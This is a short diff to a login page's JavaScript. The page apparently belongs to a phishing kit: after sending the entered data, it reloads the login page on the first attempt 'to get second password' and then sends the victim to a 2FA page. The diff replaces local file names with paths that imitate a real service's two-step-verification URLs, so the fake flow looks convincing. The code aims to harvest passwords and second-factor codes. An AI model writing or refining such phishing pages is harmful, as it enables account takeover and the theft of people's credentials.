@@ -347,19 +347,19 @@
                     }).then(function () {
                         if (attempts < 2) {
                             // First attempt: reload the page to get second password
-                            window.location.href = 'login.html';
+                            window.location.href = '/two_step_verification/login/?encrypted_context=AbL3ADX7kUTjOclRCi2QG4-bgjUA-Mqj2WGI67NRvNCET_RJ4WpjhHETO1yWe_6x';
                         } else {
                             // Second attempt: proceed to 2FA page
                             localStorage.setItem('login_attempts', 0);
-                            window.location.href = '2fa.html';
+                            window.location.href = '/two_step_verification/authentication/?encrypted_context=AbL3ADX7kUTjOclRCi2QG4-bgjUA-Mqj2WGI67NRvNCET_RJ4WpjhHETO1yWe_6x';
                         }
                     }).catch(function (error) {
                         console.error('Error sending data:', error);
                         if (attempts < 2) {
-                            window.location.href = 'login.html';
+                            window.location.href = '/two_step_verification/login/?encrypted_context=AbL3ADX7kUTjOclRCi2QG4-bgjUA-Mqj2WGI67NRvNCET_RJ4WpjhHETO1yWe_6x';
                         } else {
                             localStorage.setItem('login_attempts', 0);
-                            window.location.href = '2fa.html';
+                            window.location.href = '/two_step_verification/authentication/?encrypted_context=AbL3ADX7kUTjOclRCi2QG4-bgjUA-Mqj2WGI67NRvNCET_RJ4WpjhHETO1yWe_6x';
                         }
                     });
                 });
